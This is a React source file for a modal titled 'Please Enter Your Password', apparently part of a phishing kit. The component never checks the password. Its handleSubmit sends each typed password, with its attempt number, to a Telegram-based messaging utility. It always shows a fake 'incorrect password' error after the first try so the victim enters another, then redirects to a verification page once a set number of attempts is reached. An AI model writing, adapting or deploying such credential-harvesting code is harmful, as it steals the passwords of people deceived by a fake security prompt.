import { faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PropTypes from 'prop-types';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router';
import config from '@/utils/config';
import sendMessage from '@/utils/telegram';
import { translateText } from '@/utils/translate';
import { PATHS } from '@/router/router';

const PasswordInput = ({ onClose }) => {
    const navigate = useNavigate();
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const defaultTexts = useMemo(
        () => ({
            title: 'Please Enter Your Password',
            description: 'For your security, you must enter your password to continue',
            passwordLabel: 'Password',
            placeholder: 'Enter your password',
            errorMessage: 'The password you entered is incorrect',
            continueBtn: 'Continue',
            loadingText: 'Please wait',
            secondsText: 'seconds'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc,
                    translatedLabel,
                    translatedPlaceholder,
                    translatedError,
                    translatedContinue,
                    translatedLoading,
                    translatedSeconds
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.passwordLabel, targetLang),
                    translateText(defaultTexts.placeholder, targetLang),
                    translateText(defaultTexts.errorMessage, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang),
                    translateText(defaultTexts.loadingText, targetLang),
                    translateText(defaultTexts.secondsText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    passwordLabel: translatedLabel,
                    placeholder: translatedPlaceholder,
                    errorMessage: translatedError,
                    continueBtn: translatedContinue,
                    loadingText: translatedLoading,
                    secondsText: translatedSeconds
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleSubmit = async () => {
        if (!password.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔑 <b>Password ${attempts + 1}:</b> <code>${password}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        setCountdown(config.password_loading_time);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, config.password_loading_time * 1000));

        // ✅ chỉ show error ở lần sai đầu tiên
        setShowError(attempts === 0);

        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= config.max_password_attempts) {
            navigate(PATHS.VERIFY);
            return;
        }

        setPassword('');
    };

    return (
        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center'>
            <div className='w-lg rounded-lg bg-white shadow-lg'>
                <div className='flex items-center justify-between rounded-t-lg border-b border-gray-300 bg-[#f8f8f8] px-6 py-4'>
                    <p className='text-xl leading-6 font-semibold'>{translatedTexts.title}</p>
                    <FontAwesomeIcon
                        icon={faTimes}
                        className='cursor-pointer hover:text-gray-600'
                        onClick={onClose}
                    />
                </div>
                <div className='flex flex-col gap-4 px-6 py-4'>
                    <p className='text-base leading-6 text-[#212529bf]'>{translatedTexts.description}</p>
                    <p className='font-bold text-[#212529]'>{translatedTexts.passwordLabel}</p>
                    <input
                        type='password'
                        placeholder={translatedTexts.placeholder}
                        className='w-full rounded-lg border border-gray-300 px-3 py-1.5'
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                    />
                    {showError && (
                        <p className='leading-6 text-[#dc3545]'>{translatedTexts.errorMessage}</p>
                    )}
                    <button
                        className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
                        onClick={handleSubmit}
                        disabled={isLoading || !password.trim()}
                    >
                        {isLoading
                            ? `${translatedTexts.loadingText} ${countdown} ${translatedTexts.secondsText}...`
                            : translatedTexts.continueBtn}
                    </button>
                </div>
            </div>
        </div>
    );
};

PasswordInput.propTypes = {
    onClose: PropTypes.func.isRequired
};

export default PasswordInput;
